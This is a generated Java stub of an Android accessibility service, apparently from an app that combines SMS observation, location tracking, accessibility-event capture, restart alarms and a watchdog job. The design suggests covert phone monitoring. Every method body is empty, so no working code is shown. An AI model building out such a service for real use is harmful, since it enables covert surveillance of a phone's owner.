package com.safe.setting.app.services.accessibilityData;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000P\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\b\n\u0002\u0018\u0002\n\u0002\b\u0006\n\u0002\u0018\u0002\n\u0002\b\u0007\u0018\u0000 ,2\u00020\u00012\u00020\u0002:\u0001,B\u0005\u00a2\u0006\u0002\u0010\u0003J\b\u0010\u000e\u001a\u00020\u000fH\u0002J\b\u0010\u0010\u001a\u00020\u0011H\u0002J\b\u0010\u0012\u001a\u00020\u0013H\u0002J\u0018\u0010\u0014\u001a\u00020\u00132\u0006\u0010\u0015\u001a\u00020\u00162\u0006\u0010\u0017\u001a\u00020\u0011H\u0002J\b\u0010\u0018\u001a\u00020\u0013H\u0002J\u0012\u0010\u0019\u001a\u00020\u00132\b\u0010\u0015\u001a\u0004\u0018\u00010\u0016H\u0017J\b\u0010\u001a\u001a\u00020\u0013H\u0016J\b\u0010\u001b\u001a\u00020\u0013H\u0016J\b\u0010\u001c\u001a\u00020\u0013H\u0016J\u0010\u0010\u001d\u001a\u00020\u00132\u0006\u0010\u001e\u001a\u00020\u001fH\u0016J\u0010\u0010 \u001a\u00020\u00132\u0006\u0010!\u001a\u00020\u0011H\u0016J\u0010\u0010\"\u001a\u00020\u00132\u0006\u0010!\u001a\u00020\u0011H\u0016J\b\u0010#\u001a\u00020\u0013H\u0014J\u0012\u0010$\u001a\u00020\u00132\b\u0010%\u001a\u0004\u0018\u00010&H\u0016J\b\u0010\'\u001a\u00020\u0013H\u0002J\b\u0010(\u001a\u00020\u0013H\u0002J\b\u0010)\u001a\u00020\u0013H\u0002J\b\u0010*\u001a\u00020\u0013H\u0002J\b\u0010+\u001a\u00020\u0013H\u0002R\u001e\u0010\u0004\u001a\u00020\u00058\u0006@\u0006X\u0087.\u00a2\u0006\u000e\n\u0000\u001a\u0004\b\u0006\u0010\u0007\"\u0004\b\b\u0010\tR\u000e\u0010\n\u001a\u00020\u000bX\u0082.\u00a2\u0006\u0002\n\u0000R\u0010\u0010\f\u001a\u0004\u0018\u00010\rX\u0082\u000e\u00a2\u0006\u0002\n\u0000\u00a8\u0006-"}, d2 = {"Lcom/safe/setting/app/services/accessibilityData/AccessibilityDataService;", "Landroid/accessibilityservice/AccessibilityService;", "Landroid/location/LocationListener;", "()V", "interactor", "Lcom/safe/setting/app/services/accessibilityData/InteractorAccessibilityData;", "getInteractor", "()Lcom/safe/setting/app/services/accessibilityData/InteractorAccessibilityData;", "setInteractor", "(Lcom/safe/setting/app/services/accessibilityData/InteractorAccessibilityData;)V", "locationManager", "Landroid/location/LocationManager;", "smsObserver", "Lcom/safe/setting/app/services/sms/SmsObserver;", "createNotification", "Landroid/app/Notification;", "getDateTime", "", "getLocation", "", "handleEvent", "event", "Landroid/view/accessibility/AccessibilityEvent;", "eventType", "initializeServices", "onAccessibilityEvent", "onCreate", "onDestroy", "onInterrupt", "onLocationChanged", "location", "Landroid/location/Location;", "onProviderDisabled", "provider", "onProviderEnabled", "onServiceConnected", "onTaskRemoved", "rootIntent", "Landroid/content/Intent;", "registerSmsObserver", "scheduleRestartAlarm", "scheduleWatchdogJob", "startSmsService", "unregisterSmsObserver", "Companion", "app_release"})
public final class AccessibilityDataService extends android.accessibilityservice.AccessibilityService implements android.location.LocationListener {
    private static boolean isRunningService = false;
    @org.jetbrains.annotations.NotNull()
    public static final java.lang.String NOTIFICATION_CHANNEL_ID = "AccessibilityServiceChannel";
    public static final int NOTIFICATION_ID = 2;
    @javax.inject.Inject()
    public com.safe.setting.app.services.accessibilityData.InteractorAccessibilityData interactor;
    private android.location.LocationManager locationManager;
    @org.jetbrains.annotations.Nullable()
    private com.safe.setting.app.services.sms.SmsObserver smsObserver;
    @org.jetbrains.annotations.NotNull()
    public static final com.safe.setting.app.services.accessibilityData.AccessibilityDataService.Companion Companion = null;
    
    public AccessibilityDataService() {
        super();
    }
    
    @org.jetbrains.annotations.NotNull()
    public final com.safe.setting.app.services.accessibilityData.InteractorAccessibilityData getInteractor() {
        return null;
    }
    
    public final void setInteractor(@org.jetbrains.annotations.NotNull()
    com.safe.setting.app.services.accessibilityData.InteractorAccessibilityData p0) {
    }
    
    @java.lang.Override()
    public void onTaskRemoved(@org.jetbrains.annotations.Nullable()
    android.content.Intent rootIntent) {
    }
    
    @java.lang.Override()
    public void onCreate() {
    }
    
    private final void scheduleRestartAlarm() {
    }
    
    private final void scheduleWatchdogJob() {
    }
    
    @java.lang.Override()
    protected void onServiceConnected() {
    }
    
    private final void initializeServices() {
    }
    
    private final void startSmsService() {
    }
    
    private final android.app.Notification createNotification() {
        return null;
    }
    
    @java.lang.Override()
    @android.annotation.SuppressLint(value = {"SwitchIntDef"})
    public void onAccessibilityEvent(@org.jetbrains.annotations.Nullable()
    android.view.accessibility.AccessibilityEvent event) {
    }
    
    private final void handleEvent(android.view.accessibility.AccessibilityEvent event, java.lang.String eventType) {
    }
    
    private final java.lang.String getDateTime() {
        return null;
    }
    
    @java.lang.Override()
    public void onInterrupt() {
    }
    
    @java.lang.Override()
    public void onDestroy() {
    }
    
    private final void registerSmsObserver() {
    }
    
    private final void unregisterSmsObserver() {
    }
    
    private final void getLocation() {
    }
    
    @java.lang.Override()
    public void onLocationChanged(@org.jetbrains.annotations.NotNull()
    android.location.Location location) {
    }
    
    @java.lang.Override()
    public void onProviderEnabled(@org.jetbrains.annotations.NotNull()
    java.lang.String provider) {
    }
    
    @java.lang.Override()
    public void onProviderDisabled(@org.jetbrains.annotations.NotNull()
    java.lang.String provider) {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000 \n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u000b\n\u0002\b\u0003\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0086T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0086T\u00a2\u0006\u0002\n\u0000R\u001e\u0010\t\u001a\u00020\b2\u0006\u0010\u0007\u001a\u00020\b@BX\u0086\u000e\u00a2\u0006\b\n\u0000\u001a\u0004\b\t\u0010\n\u00a8\u0006\u000b"}, d2 = {"Lcom/safe/setting/app/services/accessibilityData/AccessibilityDataService$Companion;", "", "()V", "NOTIFICATION_CHANNEL_ID", "", "NOTIFICATION_ID", "", "<set-?>", "", "isRunningService", "()Z", "app_release"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
        
        public final boolean isRunningService() {
            return false;
        }
    }
}